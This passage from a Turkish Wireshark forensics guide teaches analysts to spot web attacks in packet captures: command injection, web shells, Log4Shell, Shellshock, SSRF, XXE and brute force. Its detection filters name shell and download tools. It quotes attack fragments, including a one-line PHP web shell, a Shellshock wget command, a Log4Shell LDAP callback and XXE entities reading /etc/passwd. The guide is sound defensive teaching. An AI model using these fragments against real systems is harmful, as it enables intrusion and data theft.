**Senden istenen:** "Saldırgan sunucuda hangi işletim sistemi komutlarını çalıştırdı?"

**Filtreler (araştırma yolu):**

- `` http.request.uri matches "(;|%3B|\\||%7C|`|%60|\\$\\(|%24%28)(id|whoami|uname|cat|ls|wget|curl|nc|bash|sh|powershell|cmd)" `` → komut ayırıcı + komut
- `` urlencoded-form.value matches "(;|\\||&&|`|\\$\\().*(whoami|id|uname|wget|curl|nc)" `` → POST verisinde komut enjeksiyonu
- `http.file_data matches "uid=[0-9]+\\("` → cevapta "id" komutunun çıktısı (uid=33(www-data))

**Filtreden sonra yol tarifi:**

1. Komut ayırıcılarını (; | && ` $()) içeren parametreleri ara.
2. Hangi komutların denendiğini sırala: whoami/id (keşif) → uname/cat (bilgi) → wget/curl (dosya indirme) → nc/bash (shell).
3. Cevaplarda komut çıktısı var mı bak: "uid=33(www-data)" Linux'ta, "nt authority\\system" Windows'ta.
4. wget/curl ile indirilen dosyanın URL'sini bul ve o indirmeyi takip et.

**Terimler:**

- **Command injection**: Uygulama girdisinin işletim sistemi kabuğunda çalıştırılması.
- **www-data**: Linux'ta web sunucusunun genel kullanıcı adı.

> **Anlık karar:** "id" komutunun çıktısı (uid=...) cevapta görünüyorsa saldırgan artık sunucuda kod çalıştırıyor (RCE).


</details>

<details>
<summary><strong>110 · Web shell yüklenmesi (file upload)</strong></summary>

**Metafor:** Bir binaya kargo görevlisi kılığında girip bir odaya gizli bir telsiz bırakmak. Telsiz, sonradan dışarıdan konuşmak içindir.

**Senden istenen:** "Web shell yüklendi mi, dosya adı ne, içeriği ne?"

**Filtreler (araştırma yolu):**

- `http.request.method == "POST" && http.content_type contains "multipart/form-data"` → dosya yükleme istekleri
- `mime_multipart.header.content-disposition contains "filename"` → yüklenen dosya adları
- `mime_multipart.header.content-disposition matches "\\.(php|phtml|php5|asp|aspx|jsp|jspx)"` → sunucuda çalışabilir uzantılar
- `http.file_data matches "(eval\\(|system\\(|passthru|shell_exec|base64_decode\\(|cmd\\.exe)"` → gövdede shell kodu

**Filtreden sonra yol tarifi:**

1. multipart POST'ları filtrele, yüklenen dosya adlarını oku.
2. Uzantıya dikkat: shell.php, resim.php.jpg, shell.phtml gibi çift uzantı/alternatif uzantı atlatmaları ara.
3. Follow HTTP Stream ile yüklenen içeriği oku; <?php system($_GET['cmd']); ?> gibi tek satır bile web shell'dir.
4. File ▸ Export Objects ▸ HTTP ile dosyayı kaydet (yükleme isteğinin içinden de çıkarılabilir).
5. Yüklemeden sonra bu dosyaya yapılan GET/POST isteklerini bul (Problem 111).

**Terimler:**

- **Web shell**: Sunucuya yerleştirilmiş, tarayıcı üzerinden komut çalıştırmayı sağlayan betik.
- **multipart/form-data**: Dosya yüklemelerinde kullanılan HTTP gövde formatı.
- **Content-Disposition**: Yüklenen parçanın adını ve dosya adını taşıyan başlık.

> **Anlık karar:** Yükleme tek başına kanıt değil; aynı dosyaya sonradan istek gelmişse web shell kullanılmış demektir.


</details>

<details>
<summary><strong>111 · Web shell ile komut çalıştırma trafiği</strong></summary>

**Metafor:** Gizli telsizden gelen komutları dinlemek: "Dosyaları listele", "Parolaları oku", "Kapıyı aç".

**Senden istenen:** "Saldırgan web shell üzerinden hangi komutları çalıştırdı, ne çıktı aldı?"

**Filtreler (araştırma yolu):**

- `http.request.uri contains "shell.php"` → yüklenen shell'e yapılan istekler
- `http.request.uri.query.parameter contains "cmd="` → cmd parametreli istekler
- `http.request.uri matches "\\?(cmd|c|exec|command|q)="` → yaygın shell parametre adları
- `http.request.method == "POST" && http.request.uri contains ".php" && http.content_length < 500` → küçük POST'lar (gizli shell'ler POST kullanır)

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'http.request.uri contains "shell.php"' -T fields -e frame.time_utc -e http.request.uri.query.parameter
```

**Filtreden sonra yol tarifi:**

1. Shell dosyasına giden tüm istekleri filtrele ve sırayla dizilmiş komutları çıkar.
2. Her isteğin cevabını Follow HTTP Stream ile oku: komut çıktısı cevap gövdesindedir.
3. Gizlenmiş shell'lerde (China Chopper, Weevely) komutlar base64 veya şifreli POST gövdesinde gelir; urlencoded-form.value'yu çöz.
4. Komut sırasını zaman çizelgesine ekle: keşif → yetki yükseltme → kalıcılık → yanal hareket.

**Terimler:**

- **China Chopper**: Çok küçük, POST tabanlı ünlü bir web shell.
- **Query parameter**: URL'de ? sonrasındaki anahtar=değer çiftleri.

> **Anlık karar:** Web shell trafiğinde cevap boyutları komutun ne döndürdüğünü ele verir. Büyük cevap = dosya okundu/listelendi.


</details>

<details>
<summary><strong>112 · Brute force login (POST form)</strong></summary>

**Metafor:** Kapıdaki şifreli kilide bir sözlükteki tüm kelimeleri sırayla denemek.

**Senden istenen:** "Giriş formuna parola denemesi yapılmış mı, başarılı parola hangisi?"

**Filtreler (araştırma yolu):**

- `http.request.method == "POST" && http.request.uri contains "login"` → giriş isteği
- `http.request.method == "POST" && urlencoded-form.key == "password"` → parola alanı içeren formlar
- `http.response.code == 302 && http.location contains "dashboard"` → başarılı girişte genelde panele yönlendirme
- `http.set_cookie contains "session"` → yeni oturum çerezi atanan cevaplar

**Filtreden sonra yol tarifi:**

1. Login POST'larını filtrele; aynı kaynaktan kısa sürede çok sayıda = brute force (Hydra, Burp Intruder).
2. Denenen kullanıcı adı ve parolaları urlencoded-form.value sütunuyla gör.
3. Başarılı denemeyi cevaptan ayırt et: başarısızlar aynı boyutta 200 (hata mesajlı sayfa), başarılı olan farklı: 302 yönlendirme, Set-Cookie veya farklı uzunluk.
4. Başarılı isteğin form verisinden kullanıcı adı ve parolayı oku.
5. Sonrasında bu oturum çereziyle yapılan istekleri takip et.

**Terimler:**

- **Hydra**: Popüler brute force aracı.
- **Set-Cookie**: Sunucunun tarayıcıya oturum çerezi verdiği başlık.
- **302**: Geçici yönlendirme; başarılı girişte sık görülür.

> **Anlık karar:** Brute force'ta cevaplar birbirinin kopyasıdır. Farklı olan tek cevap (boyut, kod, çerez) doğru paroladır.


</details>

<details>
<summary><strong>113 · HTTP Basic Auth parolasını çözmek</strong></summary>

**Metafor:** Kapıdaki görevliye şifreyi kâğıda yazıp katlayarak vermek; katlanmış kâğıt kilitli değildir, açıp okursun.

**Senden istenen:** "Hangi kullanıcı adı ve parola ile giriş yapıldı?"

**Filtreler (araştırma yolu):**

- `http.authorization` → Authorization başlığı olan istekler
- `http.authbasic` → Wireshark'ın base64'ü çözüp gösterdiği kullanıcı:parola
- `http.response.code == 401` → kimlik doğrulama isteyen cevaplar

**Menü / araç:**

- Tools ▸ Credentials → Wireshark'ın bulduğu tüm kimlik bilgileri tek listede

**Filtreden sonra yol tarifi:**

1. http.authorization filtresini uygula.
2. Paket detayında Authorization satırını aç; Wireshark "Credentials: kullanici:parola" şeklinde çözülmüş halini gösterir.
3. 401 cevabından sonra gelen 200 hangi bilgiyle geldiyse doğru parola odur; 401 ile biten denemeler yanlıştır.
4. Çok sayıda Authorization başlığı + çok sayıda 401 = brute force.

**Terimler:**

- **Basic Auth**: Kullanıcı:parola'nın base64 ile kodlanıp başlıkta gönderildiği basit kimlik doğrulama.
- **401 Unauthorized**: Kimlik doğrulama gerekli/başarısız.
- **Tools ▸ Credentials**: Wireshark 3.0+ ile gelen, düz metin kimlik bilgilerini toplayan pencere.

> **Anlık karar:** Base64 şifreleme değildir. "Basic" görürsen parola elindedir.


</details>

<details>
<summary><strong>114 · Cookie ve oturum çalma (session hijacking)</strong></summary>

**Metafor:** Birinin otel oda kartını kopyalayıp onun odasına girmek. Şifre bilmeye gerek yoktur, kart yeterlidir.

**Senden istenen:** "Çalınan oturum çereziyle başka biri giriş yaptı mı?"

**Filtreler (araştırma yolu):**

- `http.cookie contains "PHPSESSID=abc123"` → belirli oturum çerezinin kullanıldığı istekler
- `http.cookie && ip.src == 10.0.0.5` → saldırganın gönderdiği çerezler
- `http.request.uri contains "document.cookie" || http.request.uri contains "cookie="` → çerezi dışarı taşıyan XSS istekleri

**Filtreden sonra yol tarifi:**

1. Oturum çerezini (PHPSESSID, JSESSIONID, session) sütun olarak ekle.
2. Aynı çerez değerinin iki farklı IP'den kullanılıp kullanılmadığına bak. Farklı IP + aynı çerez = çalınmış oturum.
3. Çerezin nasıl çalındığını geriye doğru ara: XSS payload'ı (Problem 106), şifresiz HTTP'den dinleme veya zararlı.
4. Saldırganın bu oturumla ne yaptığını takip et.

**Terimler:**

- **Session cookie**: Giriş yapmış kullanıcıyı tanımlayan geçici kimlik.
- **Session hijacking**: Başkasının oturum çerezini kullanarak onun yerine geçme.

> **Anlık karar:** Çerez değeri bir parmak izidir. İki farklı IP'de aynı parmak izi = iki kişi aynı kimliği kullanıyor.


</details>

<details>
<summary><strong>115 · HTTP üzerinden indirilen dosyayı çıkarmak (Export Objects)</strong></summary>

**Metafor:** Kargo kayıtlarından bir paketin içeriğini yeniden oluşturmak.

**Senden istenen:** "Kurbanın indirdiği dosya ne? Hash'i nedir? İçinde ne var?"

**Filtreler (araştırma yolu):**

- `http.response && http.content_type contains "application"` → uygulama tipi (exe, zip, doc) cevaplar
- `http.content_type contains "octet-stream"` → ikili dosya indirmeleri
- `http.request.uri matches "\\.(exe|dll|ps1|bat|vbs|js|hta|zip|rar|7z|iso|lnk|docm|xlsm)$"` → şüpheli uzantılı istekler

**Menü / araç:**

- File ▸ Export Objects ▸ HTTP → tüm HTTP nesneleri listesi; Content Type ve Filename'e göre filtrele, Save

**Filtreden sonra yol tarifi:**

1. Export Objects ▸ HTTP penceresini aç; Content Type sütununa göre sırala.
2. Şüpheli dosyayı seçip Save ile kaydet (izole bir analiz klasörüne!).
3. Hash'ini al (sha256sum) ve istihbarat kaynaklarında kontrol et (Problem 220).
4. Dosya türünü uzantıya değil içeriğe göre doğrula (file komutu, magic bytes, Problem 218).
5. Export listesinde görünmüyorsa (ör. chunked/özel) Follow Stream ▸ Raw ile manuel çıkar (Problem 219).

**Terimler:**

- **Export Objects**: Wireshark'ın protokol içinden dosyaları yeniden birleştirip kaydetme özelliği.
- **Content-Type**: Gönderilen içeriğin türü (text/html, application/x-msdownload).

> **Anlık karar:** Çıkardığın dosya canlı zararlı olabilir. Asla çift tıklama; izole ortamda, hash ile çalış.


</details>

<details>
<summary><strong>116 · Zararlı executable indirildi mi? (MZ başlığı)</strong></summary>

**Metafor:** Paketin üzerinde "kitap" yazıyor ama içinden saatli bomba çıkıyor. Etiket değil içerik konuşur.

**Senden istenen:** "Kurban bir .exe indirdi mi? Uzantısı gizlenmiş olabilir mi?"

**Filtreler (araştırma yolu):**

- `http.file_data[0:2] == "MZ"` → gövdesi MZ ile başlayan cevaplar (Windows executable)
- `frame contains "This program cannot be run in DOS mode"` → EXE/DLL'lerin içindeki klasik metin
- `http.content_type contains "image" && frame contains "MZ"` → resim gibi görünüp içinde MZ taşıyan
- `tcp.payload contains 4d:5a:90:00` → TCP yükünde MZ + 90 00 (PE başlığı)

**Filtreden sonra yol tarifi:**

1. "This program cannot be run in DOS mode" araması tüm protokollerde çalışır, ilk refleksin olsun.
2. Bulunan paketin akışını Follow Stream ile aç ve hangi URL'den geldiğini bul.
3. Uzantı .jpg, .png, .txt olsa bile içerik MZ ise uzantı gizlenmiştir; bu kendi başına zararlı göstergesidir.
4. Dosyayı Export Objects ile çıkar ve hash'le.

**Terimler:**

- **MZ**: Windows çalıştırılabilir dosyaların (EXE/DLL) ilk iki byte'ı (4D 5A).
- **PE**: Portable Executable; Windows çalıştırılabilir dosya formatı.
- **Magic bytes**: Dosya türünü gösteren başlangıç byte'ları.

> **Anlık karar:** Uzantıya bakma, ilk byte'lara bak. "MZ" her zaman çalıştırılabilir demektir.


</details>

<details>
<summary><strong>117 · Log4Shell (JNDI) istismar denemesi</strong></summary>

**Metafor:** Bir binada not defterine "${bu notu okuyan, şu adrese gidip talimat alsın}" yazmak ve görevlinin gerçekten gitmesi.

**Senden istenen:** "Log4Shell (CVE-2021-44228) denemesi var mı, başarılı mı?"

**Filtreler (araştırma yolu):**

- `frame contains "jndi:"` → JNDI ifadesi (her protokolde)
- `frame matches "\\$\\{.*(jndi|lower|upper|env|::-).*\\}"` → gizlenmiş varyantlar
- `http.user_agent matches "\\$\\{" || http.request.uri contains "%24%7B"` → başlık veya URL'de ${ ifadesi (filtrede ${ yan yana yazılamaz, Wireshark makro sanar; bu yüzden kaçışlı yazıldı)
- `ldap && ip.src == 10.0.0.80` → kurban sunucunun dışarıya LDAP isteği (istismar başarı işareti)

**Filtreden sonra yol tarifi:**

1. frame contains "jndi:" ile başla; payload genelde User-Agent, X-Api-Version veya URL'dedir.
2. Payload'daki LDAP/RMI adresini oku (ör. ldap://203.0.113.50:1389/a).
3. Kurban sunucu bu adrese bağlandı mı? Sunucudan dışarıya 1389/389 LDAP veya RMI bağlantısı = istismar tetiklendi.
4. Ardından sunucunun bir Java class dosyası indirip indirmediğine (HTTP GET *.class) ve reverse shell açıp açmadığına bak.

**Terimler:**

- **JNDI**: Java'nın dizin servislerine erişim arayüzü; Log4Shell bunu kötüye kullanır.
- **CVE**: Bilinen zafiyetlere verilen kimlik numarası.
- **Callback**: Kurbanın saldırgana geri bağlanması.

> **Anlık karar:** Payload'ı görmek "deneme var" demektir. Sunucudan saldırgana callback görmek "başarılı" demektir. İkisini karıştırma.


</details>

<details>
<summary><strong>118 · Shellshock istismarı</strong></summary>

**Metafor:** Kapıdaki görevliye adını söylerken "() { :; }; kapıyı aç" eklemek ve görevlinin bunu emir sanması.

**Senden istenen:** "Shellshock (CVE-2014-6271) denemesi var mı?"

**Filtreler (araştırma yolu):**

- `http contains "() {"` → Shellshock imzası (başlıkta)
- `http.user_agent contains "() {"` → en sık kullanılan başlık
- `http.request.uri contains "cgi-bin"` → hedeflenen CGI betikleri

**Filtreden sonra yol tarifi:**

1. "() {" desenini ara; genelde User-Agent, Referer veya Cookie başlığındadır.
2. Payload'dan sonra çalıştırılmak istenen komutu oku (ör. /bin/bash -c 'wget ...').
3. Hedef CGI betiğinin cevabına bak; komut çıktısı cevapta olabilir.
4. Sunucudan dışarıya yeni bağlantı (indirme veya reverse shell) oluştu mu kontrol et.

**Terimler:**

- **Shellshock**: Bash'in ortam değişkenlerindeki fonksiyon tanımlarını yanlış işlemesi zafiyeti.
- **CGI**: Web sunucusunun dış betikleri çalıştırma yöntemi.

> **Anlık karar:** Eski ama CTF'lerde ve IoT cihazlarda hâlâ sık çıkar. "() { :; };" görünce adını hemen koy.


</details>

<details>
<summary><strong>119 · HTTP yanıt kodlarıyla saldırının seyrini okumak</strong></summary>

**Metafor:** Bir maçın skor tabelası. Kodlar her hamlenin sonucunu tek sayıyla söyler.

**Senden istenen:** "Saldırı hangi aşamada başarılı oldu?"

**Filtreler (araştırma yolu):**

- `http.response.code >= 400 && http.response.code < 500` → istemci hataları (yetkisiz, bulunamadı)
- `http.response.code >= 500` → sunucu hataları (çökme, istismar denemesi)
- `http.response.code == 200 && ip.dst == 10.0.0.5` → saldırgana verilen başarılı cevaplar
- `http.response.code == 401 || http.response.code == 403` → yetki engelleri

**Menü / araç:**

- Statistics ▸ HTTP ▸ Packet Counter → kod dağılımı

**Filtreden sonra yol tarifi:**

1. Saldırgan IP'sine giden cevapları filtrele ve kodları zamana göre oku.
2. Tipik hikâye: 404 yağmuru (keşif) → 401/403 (engel) → 200 (giriş/başarı) → 500 (istismar denemesi) → 200 (shell erişimi).
3. 200'e dönüşen her kırılma noktasını işaretle; saldırının ilerlediği anlardır.
4. 500 hataları istismar denemesinin işaretidir, ama başarı demek değildir; sonrasına bak.

**Terimler:**

- **2xx**: başarı, 3xx = yönlendirme, 4xx = istemci hatası, 5xx = sunucu hatası.
- **Response code (durum kodu)**: Sunucunun isteğin sonucunu bildiren 3 haneli sayısı.

> **Anlık karar:** Kod sırasını cümle gibi oku. 401, 401, 401, 200 = "denedi, denedi, denedi, girdi".


</details>

<details>
<summary><strong>120 · Şüpheli User-Agent'lar (PowerShell, curl, wget, python)</strong></summary>

**Metafor:** Bir partiye takım elbiseli herkesin arasında iş tulumuyla gelen biri. İnsan tarayıcıları "Mozilla/Chrome" der, betikler kendi adını söyler.

**Senden istenen:** "Hangi istekler insan değil betik/araç tarafından yapıldı?"

**Filtreler (araştırma yolu):**

- `http.user_agent matches "(powershell|WindowsPowerShell|curl|wget|python|Go-http-client|okhttp|java/|libwww|winhttp|certutil|bitsadmin)"` → betik ve sistem araçları
- `http.user_agent contains "Microsoft-CryptoAPI" || http.user_agent contains "Microsoft BITS"` → certutil ve BITS indirme araçları
- `http.user_agent matches "MSIE [5-7]\\.0"` → çok eski tarayıcı taklidi (zararlıların sevdiği sabit UA)

**Filtreden sonra yol tarifi:**

1. Tüm User-Agent'ları benzersiz listele (tshark -e http.user_agent | sort | uniq -c).
2. Kurumda olağan tarayıcıları (Chrome, Edge sürümleri) ayır; kalanlara bak.
3. PowerShell, certutil, BITS UA'ları "living off the land" indirmelerdir; indirilen dosyayı takip et (Problem 180).
4. Aynı makinede tarayıcı UA'sı ile betik UA'sı yan yana görünüyorsa betik isteği genelde zararlının işidir.

**Terimler:**

- **Living off the land (LOLBin)**: Saldırganın sistemde zaten bulunan meşru araçları kötüye kullanması.
- **certutil / bitsadmin**: Windows'un dosya indirmek için kötüye kullanılan yerleşik araçları.

> **Anlık karar:** İş istasyonundan "WindowsPowerShell" UA'sıyla bir .exe indirme isteği = yüksek öncelikli alarm.


</details>

<details>
<summary><strong>121 · HTTP POST ile veri sızdırma</strong></summary>

**Metafor:** Postaneden her gün masum görünen ama içi şirket belgeleriyle dolu koliler göndermek.

**Senden istenen:** "Veri HTTP üzerinden dışarı çıkarıldı mı, ne kadar, nereye?"

**Filtreler (araştırma yolu):**

- `http.request.method == "POST" && !(ip.dst == 10.0.0.0/8)` → dış sunuculara POST'lar
- `http.request.method == "POST" && http.content_length > 100000` → büyük POST gövdeleri
- `http.request.method == "POST" && http.content_type contains "octet-stream"` → ikili veri yüklemeleri
- `http.request.method == "PUT"` → PUT ile dosya yükleme

**Filtreden sonra yol tarifi:**

1. Dışarı giden POST/PUT'ları filtrele, http.content_length'e göre sırala.
2. Hedef host'u değerlendir: meşru bulut servisi mi, bilinmeyen bir alan mı?
3. Gövde içeriğine bak: zip başlığı (PK), base64 bloğu, CSV, belge adları.
4. Gövdeyi Export Objects ▸ HTTP ile kaydet (POST gövdeleri de listelenir) veya Follow Stream ▸ Raw ile çıkar.
5. Toplam sızdırılan veri miktarını hesapla (Problem 192).

**Terimler:**

- **Content-Length**: HTTP gövdesinin byte cinsinden boyutu.
- **PUT**: Sunucuya dosya yazma metodu.

> **Anlık karar:** İş istasyonları web'den alır, nadiren büyük gönderir. Dışarı giden büyük POST her zaman incelenir.


</details>

<details>
<summary><strong>122 · Admin paneli ve login sayfası keşfi</strong></summary>

**Metafor:** Bir binada "Yönetim katı" levhasını arayan yabancı.

**Senden istenen:** "Saldırgan yönetim arayüzlerini buldu mu?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "(admin|administrator|wp-admin|wp-login|phpmyadmin|manager/html|cpanel|login|dashboard|console)"` → yönetim yolları
- `http.request.uri contains "manager/html"` → Tomcat yönetici paneli (WAR yükleme ile shell klasiği)
- `http.request.uri contains "wp-login.php" && http.request.method == "POST"` → WordPress giriş denemeleri

**Filtreden sonra yol tarifi:**

1. Yönetim yollarına giden istekleri filtrele ve cevap kodlarına bak.
2. 200 veya 401 dönen paneller saldırgan tarafından bulunmuştur.
3. Tomcat manager'a Basic Auth ile giriş + WAR dosyası yükleme = klasik shell yükleme zinciri; Problem 113 ve 110 ile birleştir.
4. phpMyAdmin'e başarılı giriş varsa veritabanı sorgularını oku (HTTP içinde SQL görünür).

**Terimler:**

- **Admin panel**: Uygulamayı yönetme arayüzü.
- **WAR**: Java web uygulaması paketi; Tomcat'e yüklenince çalışır.

> **Anlık karar:** Yönetim paneline başarılı giriş, saldırının "kale içi" anıdır. Zaman çizelgesinde kırmızı işaretle.


</details>

<details>
<summary><strong>123 · SSRF ve iç kaynaklara yapılan istekler</strong></summary>

**Metafor:** Resepsiyoniste "kasadaki dosyayı bana okur musun?" diye sordurtmak. Sen kasaya giremezsin ama resepsiyonist girebilir.

**Senden istenen:** "Sunucu, saldırganın isteğiyle iç ağa veya bulut meta verisine erişti mi?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "(url|uri|link|redirect|next|dest|path|file)=(https?|gopher|file|dict)(:|%3A)"` → URL alan parametreler
- `http.request.uri contains "169.254.169.254"` → bulut meta veri servisi adresi
- `ip.dst == 169.254.169.254` → sunucunun meta veri servisine bağlanması
- `http.request.uri matches "(127\\.0\\.0\\.1|localhost|0\\.0\\.0\\.0|\\[::1\\])"` → parametrede yerel adres

**Filtreden sonra yol tarifi:**

1. Parametre olarak URL taşıyan istekleri bul.
2. Değerde iç IP, localhost veya 169.254.169.254 varsa SSRF denemesidir.
3. Sunucunun bu iç adrese gerçekten istek atıp atmadığını (sunucu kaynaklı trafik) kontrol et.
4. Bulut meta verisinden IAM kimlik bilgisi çekildiyse (/latest/meta-data/iam/security-credentials/) cevabı oku; kritik bulgudur.

**Terimler:**

- **SSRF**: Server-Side Request Forgery; sunucuyu saldırgan adına istek atmaya zorlama.
- **Metadata service**: Bulut sunucularının kendi bilgilerini (ve geçici anahtarlarını) aldığı 169.254.169.254 adresi.

> **Anlık karar:** 169.254.169.254 bir parametrede görünüyorsa ve sunucu oraya gittiyse bulut anahtarları tehlikededir.


</details>

<details>
<summary><strong>124 · XXE (XML External Entity)</strong></summary>

**Metafor:** Bir forma "ekteki dosyanın içeriğini de bu forma yapıştır" talimatı gizlemek ve sistemin uyması.

**Senden istenen:** "XML işleyen uygulamada XXE ile dosya okundu mu?"

**Filtreler (araştırma yolu):**

- `http.file_data contains "<!ENTITY"` → XML entity tanımı
- `http.file_data contains "SYSTEM \"file://" || http.file_data contains "SYSTEM \"http"` → dış kaynak entity'leri
- `http.content_type contains "xml" && http.request.method == "POST"` → XML gönderen istekler

**Filtreden sonra yol tarifi:**

1. XML gönderen POST'ları filtrele, gövdede DOCTYPE ve ENTITY tanımı ara.
2. Entity'nin işaret ettiği kaynağı oku (file:///etc/passwd, http://saldirgan/...).
3. Cevapta dosya içeriği var mı bak (Problem 107'deki kanıtlar).
4. Kör XXE'de sunucunun saldırganın sunucusuna dışarıdan bağlanıp bağlanmadığını kontrol et.

**Terimler:**

- **XML**: Yapılandırılmış veri formatı.
- **Entity**: XML'de bir değere verilen takma ad; dış kaynak gösterebilir.

> **Anlık karar:** XML gövdesinde "SYSTEM" kelimesi görürsen dur ve oku.


</details>

<details>
<summary><strong>125 · HTTP/2 trafiğini okumak</strong></summary>

**Metafor:** Aynı sohbetin tek tek mektuplar yerine, numaralı şeritlere bölünüp aynı zarfta paralel taşınması.

**Senden istenen:** "HTTP/2 kullanan trafikte istekleri nasıl görürüm?"

**Filtreler (araştırma yolu):**

- `http2` → HTTP/2 çerçeveleri (genelde TLS çözüldükten sonra görünür)
- `http2.type == 1` → HEADERS çerçeveleri (istek ve cevap başlıkları)
- `http2.headers.path` → istek yolları
- `http2.headers.authority contains "kotu"` → hedef alan adı (HTTP/1'deki Host başlığının karşılığı)
- `http2.header.name == ":method" && http2.header.value == "POST"` → POST istekleri

**Filtreden sonra yol tarifi:**

1. HTTP/2 neredeyse her zaman TLS içindedir; önce TLS'yi çöz (Problem 128).
2. http2.type == 1 ile başlık çerçevelerini filtrele; :method, :path, :authority sözde başlıklarını oku.
3. Her istek bir stream ID taşır; aynı TCP bağlantısında birden fazla istek paralel akar. http2.streamid ile ayır.
4. Follow ▸ HTTP/2 Stream ile tek bir isteği ve cevabını oku.

**Terimler:**

- **HTTP/2**: Tek bağlantıda birden fazla isteği paralel taşıyan HTTP sürümü.
- **Pseudo-header**: :method, :path, :authority gibi iki nokta ile başlayan özel başlıklar.
- **Multiplexing**: Birden fazla akışı tek bağlantıda iç içe taşıma.

> **Anlık karar:** HTTP/1 filtrelerin (http.request.uri) HTTP/2'de çalışmaz. Doğru alan adları http2.headers.* altındadır.


</details>

## F · TLS, Şifreli Trafik, SSH, VPN ve QUIC

*Şifreli trafik kilitli bir zarftır: içini okuyamazsın ama üstünde kime gittiği (SNI), hangi postane damgası (sertifika), hangi el yazısı (JA3/JA4) ve ne sıklıkla gönderildiği (zamanlama) yazar. Bu bölüm zarfı açmadan konuşturmayı öğretir.*

<details>
<summary><strong>126 · Şifreli trafikte hangi siteye gidildiğini bulmak (SNI)</strong></summary>

**Metafor:** Kapalı zarfın üstündeki alıcı adı. İçerik gizli, ama zarfın kime gittiği yazıyor.

**Senden istenen:** "Kurban HTTPS ile hangi alan adına bağlandı?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 1` → Client Hello (istemcinin el sıkışma başlangıcı)
- `tls.handshake.extensions_server_name` → SNI alanı olan paketler
- `tls.handshake.extensions_server_name contains "kotu"` → belirli alana bağlantı

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'tls.handshake.type == 1' -T fields -e ip.src -e ip.dst -e tls.handshake.extensions_server_name | sort | uniq -c | sort -rn
```

**Filtreden sonra yol tarifi:**

1. Client Hello'ları filtrele ve SNI'yi sütun olarak ekle.
2. tshark ile "kaynak - hedef IP - alan adı" listesini çıkar.
3. DNS'ten (Problem 076) gelen listeyle karşılaştır; SNI'de olup DNS'te olmayan alan, IP'nin sabit kodlandığına veya DoH kullanıldığına işaret eder.
4. Bilinmeyen/şüpheli alanları işaretleyip sonraki adımlarda (sertifika, JA3, zamanlama) incele.

**Terimler:**

- **TLS**: Web'in şifreleme protokolü (HTTPS'in S'si). Eski adı SSL.
- **Client Hello**: TLS el sıkışmasında istemcinin ilk mesajı; desteklediği şifreleri ve SNI'yi içerir.
- **SNI**: Server Name Indication; istemcinin bağlanmak istediği alan adını açıkça yazdığı alan.

> **Anlık karar:** HTTPS'te "nereye gidildi?" sorusunun cevabı her zaman önce SNI'dedir. Sonra sertifikaya bakarak doğrularsın.


</details>

<details>
<summary><strong>127 · TLS el sıkışmasını okumak</strong></summary>

**Metafor:** İki diplomatın görüşmeden önce hangi dili, hangi tercümanı kullanacaklarını ve kimlik belgelerini karşılıklı göstermesi.

**Senden istenen:** "TLS bağlantısı kuruldu mu, hangi sürüm ve şifre takımı seçildi?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 1` → Client Hello
- `tls.handshake.type == 2` → Server Hello (sunucunun seçimi)
- `tls.handshake.type == 11` → Certificate (sunucu sertifikası; TLS 1.3'te şifreli olduğu için görünmez)
- `tls.record.content_type == 23` → Application Data (şifreli asıl veri)
- `tls.alert_message` → uyarı/hata mesajları

**Filtreden sonra yol tarifi:**

1. Bir TLS akışını tcp.stream ile izole et ve Flow Graph'ta sırayı gör.
2. Client Hello: istemcinin önerdiği sürümler, şifre takımları, SNI, ALPN.
3. Server Hello: sunucunun seçtiği sürüm ve tek bir şifre takımı. TLS 1.3 için "supported_versions" uzantısına bak (record sürümü yanıltıcıdır).
4. Certificate (TLS 1.2): sunucunun kimliği. TLS 1.3'te bu adım şifrelidir.
5. Application Data başlamışsa el sıkışma başarılıdır; Alert ile bitmişse başarısızdır (Problem 137).

**Terimler:**

- **Handshake**: Şifreli iletişim başlamadan önceki pazarlık.
- **Cipher suite**: Kullanılacak şifreleme algoritmalarının paketi.
- **Application Data**: Şifrelenmiş uygulama verisi.

> **Anlık karar:** Sürümü record başlığından değil, Server Hello'daki supported_versions uzantısından oku; TLS 1.3 kendini 1.2 gibi gösterir.


</details>

<details>
<summary><strong>128 · SSLKEYLOGFILE ile TLS çözmek</strong></summary>

**Metafor:** Kilitli zarfların anahtarlarını içeren bir anahtarlık bulmak. Anahtarlık varsa her zarfı açarsın.

**Senden istenen:** CTF'lerde "Size bir keylog dosyası verildi, şifreli trafiği çözüp flag'i bulun."

**Filtreler (araştırma yolu):**

- `tls && http` → çözüldükten sonra TLS içindeki HTTP
- `http2` → çözüldükten sonra HTTP/2
- `tls.app_data` → hâlâ çözülmemiş uygulama verisi (anahtar eşleşmeyenler)

**Menü / araç:**

- Edit ▸ Preferences ▸ Protocols ▸ TLS ▸ (Pre)-Master-Secret log filename → keylog dosyasını seç
- Alternatif: TLS paketine sağ tık ▸ Protocol Preferences ▸ Transport Layer Security ▸ (Pre)-Master-Secret log filename

**Komut satırı:**

```bash
editcap --inject-secrets tls,keylog.txt kanit.pcapng cozulu.pcapng
```

**Filtreden sonra yol tarifi:**

1. Keylog dosyasının formatını kontrol et; satırlar "CLIENT_RANDOM ..." veya TLS 1.3 için "CLIENT_HANDSHAKE_TRAFFIC_SECRET ..." ile başlar.
2. Preferences'ta dosya yolunu ver ve tamam de. Paket listesinde artık HTTP/HTTP2 görünmeye başlar.
3. Alt panelde "Decrypted TLS" sekmesi çıkar; çözülmüş byte'lar buradadır.
4. Follow ▸ TLS Stream veya Follow ▸ HTTP Stream ile içeriği oku; Export Objects ▸ HTTP çalışır hale gelir.
5. Kanıtı paylaşmak için editcap --inject-secrets ile anahtarı pcapng'ye göm; alıcı ek ayar yapmadan çözer.

**Terimler:**

- **SSLKEYLOGFILE**: Tarayıcıların (Chrome, Firefox) oturum anahtarlarını yazdığı ortam değişkeni.
- **Client Random**: Client Hello'daki rastgele değer; keylog satırını doğru oturumla eşleştirir.
- **Session key**: O oturuma özel geçici şifreleme anahtarı.

> **Anlık karar:** Çözülme olmuyorsa: keylog doğru oturuma ait mi (Client Random eşleşiyor mu), pcap el sıkışmayı içeriyor mu? El sıkışma yoksa anahtar işe yaramaz.


</details>

<details>
<summary><strong>129 · RSA private key ile TLS çözmek (eski senaryolar)</strong></summary>

**Metafor:** Sunucunun ana anahtarıyla, ona gelen tüm mektupları açmak. Ama sadece eski tip kilitlerde işe yarar.
